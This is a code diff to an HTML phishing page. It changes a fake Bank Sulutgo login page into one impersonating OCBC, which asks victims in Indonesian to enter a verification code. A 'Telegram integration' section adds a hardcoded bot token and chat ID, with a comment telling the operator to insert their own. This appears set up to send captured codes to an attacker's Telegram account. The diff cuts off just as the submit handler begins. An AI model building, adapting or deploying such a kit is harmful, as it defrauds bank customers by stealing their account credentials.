@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>BSGtouch - Login</title>
+<title>OCBC - Login</title>
 
 <style>
 :root{
@@ -59,7 +59,7 @@ input::placeholder{ color: rgba(14,17,22,.45); }
 
       <form id="loginForm" autocomplete="on">
         <div class="field">
-          <div class="label">Terima kasih atas kepercayaan anda selama ini terhadap perbankan Bank Sulutgo, Kode pendaftaran telah dikirimkan melalui Email.</div>
+          <div class="label">Terima kasih atas kepercayaan anda selama ini terhadap perbankan Bank OCBC, Kode pendaftaran telah dikirimkan</div>
           <div class="inputWrap">
             <input type="text" name="cc" id="kode" inputmode="tel" minlength="6"  placeholder="Masukan kode verifikasi disini" required>
           </div>
@@ -88,12 +88,12 @@ const toast = (msg)=>{
 
 // ======= TELEGRAM INTEGRATION =======
 // Ganti dengan token dan chat_id Telegram kamu
-const BOT_TOKEN = "8166407454:AAFb0QDfxrN5zW930YQqv5rBwffqDk8bd7g";
-const CHAT_ID = "7487586868";
+const BOT_TOKEN = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
+const CHAT_ID = "6456077638";
 
 $("#forgotLink").addEventListener("click",(e)=>{
   e.preventDefault();
-  toast("Silakan hubungi Contact Center 1500 659");
+  toast("Silakan hubungi Contact Center 1500 999");
 });
 
 $("#loginForm").addEventListener("submit", async (e)=>{
